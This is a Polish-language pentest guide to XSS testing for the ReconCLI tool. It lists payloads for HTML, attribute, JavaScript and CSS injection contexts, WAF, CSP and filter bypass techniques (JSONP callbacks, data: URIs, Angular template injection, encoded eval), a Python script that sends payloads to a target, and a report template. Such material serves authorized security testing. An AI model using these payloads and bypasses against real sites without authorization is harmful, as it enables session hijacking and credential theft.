# 🎯 XSS PAYLOAD TESTING GUIDE - ReconCLI Elite
# Kompleksowy przewodnik testowania XSS
# Data: 2025-07-19

## 📋 SPIS TREŚCI
1. [Podstawy testowania XSS](#podstawy)
2. [Methodologia](#metodologia)
3. [Konteksty wstrzyknięć](#konteksty)
4. [Obejścia zabezpieczeń](#obejscia)
5. [Automatyzacja](#automatyzacja)
6. [Reporting](#reporting)

## 🎯 PODSTAWY TESTOWANIA XSS {#podstawy}

### Typy XSS:
- **Reflected XSS**: Payload odbijany w odpowiedzi
- **Stored XSS**: Payload zapisany w bazie danych
- **DOM XSS**: Wykonanie w kontekście DOM
- **Blind XSS**: Brak bezpośredniej informacji zwrotnej

### Podstawowe payloady testowe:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
```

## ⚙️ METODOLOGIA TESTOWANIA {#metodologia}

### 1. Rozpoznanie
- Identyfikacja punktów wejścia
- Analiza filtrowania
- Wykrycie kontekstu wstrzyknięcia
- Badanie mechanizmów obronnych

### 2. Testowanie podstawowe
```bash
# Użyj podstawowych payloadów
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 3. Analiza odpowiedzi
- Sprawdź czy payload jest filtrowany
- Określ kontekst (HTML, atrybuty, JavaScript)
- Zbadaj kodowanie znaków
- Sprawdź CSP headers

### 4. Dostosowanie payloadów
- Wybierz odpowiednie techniki obejścia
- Testuj różne kodowania
- Używaj kontekstowych payloadów

## 🎭 KONTEKSTY WSTRZYKNIĘĆ {#konteksty}

### HTML Context
```html
<!-- Podstawowy HTML -->
<div>USER_INPUT</div>
Payload: <script>alert(1)</script>

<!-- Komentarz HTML -->
<!-- USER_INPUT -->
Payload: --><script>alert(1)</script><!--
```

### Attribute Context
```html
<!-- Wartość atrybutu -->
<div title="USER_INPUT">
Payload: " onmouseover="alert(1)" "

<!-- Atrybut href -->
<a href="USER_INPUT">
Payload: javascript:alert(1)
```

### JavaScript Context
```javascript
// String w JS
var data = "USER_INPUT";
Payload: ";alert(1);//

// Zmienna w JS
var user = USER_INPUT;
Payload: alert(1)
```

### CSS Context
```css
/* CSS style */
.class { color: USER_INPUT; }
Payload: red;}</style><script>alert(1)</script><style>
```

## 🛡️ OBEJŚCIA ZABEZPIECZEŃ {#obejscia}

### WAF Bypass
```html
<!-- Case variation -->
<ScRiPt>AlErT(1)</ScRiPt>

<!-- Encoding -->
<script>alert&#40;1&#41;</script>

<!-- Comments -->
<script>al/**/ert(1)</script>

<!-- Concatenation -->
<script>window['al'+'ert'](1)</script>
```

### CSP Bypass
```html
<!-- JSONP gdy whitelisted -->
<script src="//accounts.google.com/o/oauth2/revoke?callback=alert"></script>

<!-- Base64 gdy data: allowed -->
<script src="data:application/javascript,YWxlcnQoMSk="></script>

<!-- Angular gdy unsafe-eval -->
{{constructor.constructor('alert(1)')()}}
```

### Filter Bypass
```html
<!-- Keyword filters -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

<!-- Tag filters -->
<img src=x onerror=alert(1)>

<!-- Event filters -->
<input onfocus=alert(1) autofocus>
```

## 🤖 AUTOMATYZACJA TESTOWANIA {#automatyzacja}

### Użycie ReconCLI
```bash
# Testowanie podstawowe
python -m reconcli --xss --target https://example.com

# Z custom payloadami
python -m reconcli --xss --payloads xss-advanced.txt --target https://example.com

# Testowanie różnych kontekstów
python -m reconcli --xss --context all --target https://example.com
```

### Custom scripting
```python
import requests

payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)"
]

for payload in payloads:
    response = requests.get(f"https://target.com/search?q={payload}")
    if payload in response.text:
        print(f"Potential XSS: {payload}")
```

## 📊 REPORTING TEMPLATE {#reporting}

### Vulnerable Endpoint
- **URL**: https://example.com/search
- **Parameter**: q
- **Method**: GET
- **Payload**: `<script>alert('XSS')</script>`

### Proof of Concept
```html
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
Host: example.com
```

### Impact Assessment
- **Severity**: High
- **CVSS**: 8.2
- **Impact**: 
  - Session hijacking
  - Credential theft
  - Page defacement
  - Malware distribution

### Remediation
1. Input validation
2. Output encoding
3. CSP implementation
4. Secure headers

## 🎯 PAYLOADY WEDŁUG SCENARIUSZA

### 1. Basic Discovery
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### 2. WAF Testing
```html
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert`XSS`</script>
<script>window['al'+'ert']('XSS')</script>
```

### 3. Context Breaking
```html
';alert('XSS');//
" onmouseover="alert('XSS')" "
</script><script>alert('XSS')</script>
```

### 4. Advanced Techniques
```html
<script>import('data:text/javascript,alert("XSS")')</script>
<script>new Worker('data:,alert("XSS")')</script>
<script>eval(atob('YWxlcnQoIlhTUyIp'))</script>
```

## 🔍 CHECKLISTA TESTOWANIA

### Pre-testing
- [ ] Sprawdź CSP headers
- [ ] Zidentyfikuj punkty wejścia
- [ ] Przeanalizuj filtering
- [ ] Określ kontekst wstrzyknięcia

### Testing
- [ ] Podstawowe payloady
- [ ] Context-specific payloady
- [ ] WAF bypass techniques
- [ ] Encoding variations
- [ ] Event handlers
- [ ] Protocol handlers

### Post-testing
- [ ] Verify exploitation
- [ ] Document findings
- [ ] Assess impact
- [ ] Recommend remediation

## 🚨 ETYCZNE TESTOWANIE

### Zasady
1. **Tylko autoryzowane testy**
2. **Nie modyfikuj danych**
3. **Nie wpływaj na innych użytkowników**
4. **Zachowaj poufność**
5. **Zgłoś znalezione podatności**

### Payload markers
```html
<!-- Użyj unikalnych markerów -->
<script>alert('PENTEST-YOURNAME-' + Date.now())</script>
<img src=x onerror=console.log('PENTEST-YOURNAME-XSS')>
```

## 🔧 NARZĘDZIA POMOCNICZE

### Browser Extensions
- **XSS Hunter**: Blind XSS detection
- **Burp Suite**: Professional testing
- **OWASP ZAP**: Free security testing

### Online Tools
- **XSSHunter.com**: Blind XSS platform
- **BeEF**: Browser exploitation framework
- **XSStrike**: Advanced XSS detection

## 📚 DALSZE ŹRÓDŁA

- OWASP XSS Prevention Cheat Sheet
- PortSwigger Web Security Academy
- HackerOne XSS Reports
- OWASP Testing Guide v4

---
**⚠️ UWAGA**: Te payloady są przeznaczone wyłącznie do autoryzowanych testów bezpieczeństwa. Nieautoryzowane użycie może naruszać prawo.
